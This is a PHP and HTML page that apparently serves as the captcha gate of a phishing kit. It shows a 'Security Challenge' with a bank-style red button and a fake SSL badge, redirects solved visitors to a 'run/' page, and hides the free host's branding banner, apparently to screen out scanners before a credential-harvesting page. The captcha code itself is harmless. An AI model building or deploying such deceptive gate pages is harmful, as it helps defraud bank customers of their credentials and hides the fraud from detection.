<?php
session_start();

if ( isset($_POST['captcha']) && ($_POST['captcha']!="") ){
// Validation: Checking entered captcha code with the generated captcha code
    if(strcasecmp($_SESSION['captcha'], $_POST['captcha']) == 0){
// Note: the captcha code is compared case insensitively.
// if you want case sensitive match, check above with strcmp()
    $_SESSION['ValidCaptcha'] = 'valid';
    header('Location: run/index.html');
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Please Enter Security Challenge</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
<link rel="shortcut icon" href="run/Information_files/favicon.png"/>
<style>
.btn-login-welcome 
{
    background-color: #D71E28;
	text-decoration: none;
	font-family: Verdana, Geneva, Tahoma, sans-serif;
    color: #ffffff;
    width: 205px;
	height: 40px;
    font-size: 16px;
    border-radius: 8px;
    border: none;
	margin-top:15px;
}
.btn-login-welcome:hover
{    background-color: #BB0826;
	text-decoration: underline;}
</style>
</head>
<body>
	<div align="center">
	<div style="padding-top:10px;padding-bottom:10px;">
	<img src="logo.png">
	  <br>
      <img src="ssl.png" width="126" height="28">
	  </div>
	 <div style="padding-top:10px;padding-bottom:10px;">
	 <h3>Security Challenge</h3>
	 </div>
    <div id="app">
	 <img src="run/captcha.php?rand=<?php echo rand(); ?>" id='captcha_image'>
	  <form action="" method="post">
      <input type="tel"  placeholder="Captcha code" class="input" name="captcha">
	 <div>
      <button type="submit" class="btn-login-welcome">Continue</button>
	</div>
     </form>
	</div>
    </div>
		<style>
img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {
display: none;}
</style>
</body>
</html>
<ISONLINE VALUE=TRUE></ISONLINE>